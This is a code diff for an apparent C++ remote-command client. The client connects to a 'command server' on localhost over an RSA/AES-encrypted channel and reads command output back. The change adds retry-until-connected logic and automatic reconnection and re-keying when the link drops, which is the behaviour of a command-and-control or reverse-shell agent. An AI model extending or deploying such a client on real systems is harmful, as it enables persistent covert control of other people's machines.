@@ -117,16 +117,8 @@ void sendEncrypted(const char *message, int len) {
     sendEncrypted((const byte*)message, len);
 }
 
-void recvDecrypted() {
-    recv(mainSocket, buf, max, 0);
-    string half = base64_decode(string((char*)buf));
-    cfbDecryption->ProcessData((byte*)buf, (byte*)half.c_str(), half.size());
-    buf[half.size()] = 0;
-}
-
 void initNET() {
     mainSocket = socket(AF_INET, SOCK_STREAM, 0);
-    buf = (char *)malloc(max + 2) + 1;
 
     sockaddr addr;
     addr.sa_family = AF_INET;
@@ -134,7 +126,12 @@ void initNET() {
     *((int*)&addr + 1) = htonl(inet_network("127.0.0.1"));
 
     printf("Searching command server...\n");
-    connect(mainSocket, &addr, sizeof(addr));
+    while (connect(mainSocket, &addr, sizeof(addr)))
+        usleep(2000000);
+}
+
+void initMEM() {
+    buf = (char *)malloc(max + 2) + 1;
 }
 
 void* startCommand(void *) {
@@ -144,11 +141,25 @@ void* startCommand(void *) {
     while (fgets(buf + current, max - current - 2, processOutput) != NULL && current != max - 2)
         current += strlen(buf + current);
 
+    buf[current] = 0;
     processOutput = NULL;
     printf("I have: %s", buf - 1);
 }
 
+void recvDecrypted() {
+    if (recv(mainSocket, buf, max, 0) == 0) {
+        initNET();
+        initAES();
+        recvDecrypted();
+        return;
+    }
+    string half = base64_decode(string((char*)buf));
+    cfbDecryption->ProcessData((byte*)buf, (byte*)half.c_str(), half.size());
+    buf[half.size()] = 0;
+}
+
 int main() {
+    initMEM();
     initRSA();
     initNET();
     initAES();
